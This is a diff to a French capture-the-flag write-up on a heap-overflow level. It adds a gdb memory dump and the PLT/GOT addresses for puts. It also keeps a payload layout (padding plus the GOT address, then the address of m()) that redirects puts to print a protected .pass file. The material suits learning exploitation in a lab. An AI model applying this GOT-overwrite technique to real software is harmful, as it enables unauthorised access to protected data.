@@ -7,15 +7,27 @@
 - Deux paires de blocs liés:
   - Premier bloc (`0x804a008`) pointe vers buffer1 (`0x804a018`)
   - Deuxième bloc (`0x804a028`) pointe vers buffer2 (`0x804a038`)
-- Adresse GOT de `puts`: `0x08049928`
-- Adresse de la fonction `m()`: `0x080484f4`
 
-0xb7ea89f0
+```nasm
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x00000000      0x00000000      0x00000011
+0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
+0x804a038:      0x41414141      0x00000000      0x00000000      0x00020fc1
+```
+
+- Adresse de saut dans la GOT de `puts`: `0x08049928`
+
+```nasm
+(gdb) x/i 0x08048400
+   0x8048400 <puts@plt>:        jmp    *0x8049928
+```
+- Adresse de la fonction `m()`: `0x080484f4`
 
 **Comportement**
 - Le programme copie les arguments dans les buffers avec `strcpy()`
 - Lecture du fichier `.pass` avec `fopen()` et `fgets()`
 - Appel à `puts()` pour afficher un message
+- On veut faire un call a la fonction `m()` pour `printf()` le contenu du fichier .pass
 
 ## Exploitation
 
@@ -30,7 +42,7 @@
 ```
 
 Le payload:
-1. Premier argument: 20 bytes de padding + adresse GOT de `puts`
+1. Premier argument: 20 bytes de padding + adresse jmp GOT de `puts`
 2. Second argument: adresse de la fonction `m()`
 
 Cette exploitation redirige l'appel à `puts()` vers la fonction `m()`, permettant l'affichage du contenu du fichier `.pass`.
